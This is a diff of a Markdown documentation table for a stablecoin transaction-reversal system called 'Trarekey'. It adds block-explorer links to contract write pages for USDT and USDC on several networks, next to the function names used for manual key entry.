@@ -81,18 +81,18 @@ Upon validation, frozen funds are returned to the sender’s wallet.
 
 ## Links and functions for manual entry of the Trarekey
 
-| Network & Token        | Function                                    |
-|------------------------|---------------------------------------------|
-| USDT (Ethereum Mainnet)| 1. _verifyTxAndKey (0xb158845c)            |
-|                        | 2. _xReverseTransactionInit (0xf9b3951a)   |
-| USDC (Ethereum Mainnet)| 1. _verifyTxAndKey (0xb158845c)            |
-|                        | 2. _xReverseTransactionInit (0xf9b3951a)   |
-| USDT (BNB Smart Chain) | 1. _verifyTxAndKey (0xb158845c)            |
-|                        | 2. _xReverseTransactionInit (0xf9b3951a)   |
-| USDC (BNB Smart Chain) | 1. _verifyTxAndKey (0xb158845c)            |
-|                        | 2. _xReverseTransactionInit (0xf9b3951a)   |
-| USDC (Base Mainnet)    | 1. _verifyTxAndKey (0xb158845c)            |
-|                        | 2. _xReverseTransactionInit (0xf9b3951a)   |
+| Network & Token                                      | Function                                    |
+|-----------------------------------------------------|---------------------------------------------|
+| [USDT (Ethereum Mainnet)](https://etherscan.io/address/0xB264fec117E1b8D63813B0E43e00c051cd2B98ed#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
+|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
+| [USDC (Ethereum Mainnet)](https://etherscan.io/address/0xa23EC1689AF0d2B9CF0DAC67C4894Ecd1A3A9185#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
+|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
+| [USDT (BNB Smart Chain)](https://bscscan.com/address/0xdc1FAFE24dd24151a64e72A74B8bA1Bd6C775444#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
+|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
+| [USDC (BNB Smart Chain)](https://bscscan.com/address/0xb4e25FCa9D90b5D16c52bbe3d64909185aA3ec77#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
+|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
+| [USDC (Base Mainnet)](https://basescan.org/address/0xb4e25FCa9D90b5D16c52bbe3d64909185aA3ec77#writeContract) | 1. _verifyTxAndKey (0xb158845c)            |
+|                                                     | 2. _xReverseTransactionInit (0xf9b3951a)   |
 
 
 
